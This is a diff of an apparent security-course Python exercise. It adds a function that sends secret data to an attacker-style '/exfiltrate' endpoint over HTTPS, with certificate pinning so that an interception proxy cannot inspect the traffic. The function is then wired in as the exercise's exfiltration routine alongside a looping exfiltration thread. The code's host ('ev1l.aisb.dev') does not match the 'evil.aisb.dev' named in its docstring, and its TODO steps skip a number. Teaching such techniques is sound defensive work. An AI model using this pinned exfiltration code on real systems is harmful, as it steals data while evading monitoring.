@@ -64,6 +64,7 @@ if __name__ == "__main__":  # Only executed when running the script directly
     thread = threading.Thread(target=loop_exfiltration)
     thread.start()
 
+
 # %%
 def make_evil_request_https(secret_data: str) -> Optional[str]:
     """
@@ -86,7 +87,10 @@ def make_evil_request_https(secret_data: str) -> Optional[str]:
     except Exception as inst:
         print(inst)
         return None
+
+
 from w1d2_test import test_make_evil_request_https
+
 test_make_evil_request_https(make_evil_request_https)
 
 
@@ -94,3 +98,42 @@ test_make_evil_request_https(make_evil_request_https)
 exfiltrate_data = make_evil_request_https
 
 # %%
+
+
+def make_evil_request_pinned(secret_data: str) -> Optional[str]:
+    """
+    Send a GET request over HTTPS with certificate pinning to evil.aisb.dev.
+
+    This function uses certificate pinning to ensure we're talking to the real
+    evil.aisb.dev server, not a MITM proxy with a self-signed certificate.
+
+    Args:
+        secret_data: The secret information to exfiltrate
+
+    Returns:
+        The response text from the server, or None if the request fails
+    """
+    # TODO: Implement certificate pinning:
+    #   1. Make a GET request to https://evil.aisb.dev/exfiltrate?data=secret_data
+    #   2. Use verify='isrg-root-x1.pem' as a parameter to requests to pin the certificate
+    #   4. Return the response text if successful, None otherwise
+    try:
+        resp = requests.get(
+            "https://ev1l.aisb.dev/exfiltrate",
+            params={"data": secret_data},
+            timeout=5,
+            verify="isrg-root-x1.pem",
+        )
+        if resp.status_code != 200:
+            return None
+        return resp.text
+    except Exception as inst:
+        print(inst)
+        return None
+
+
+from w1d2_test import test_make_evil_request_pinned
+
+test_make_evil_request_pinned(make_evil_request_pinned)
+
+exfiltrate_data = make_evil_request_pinned
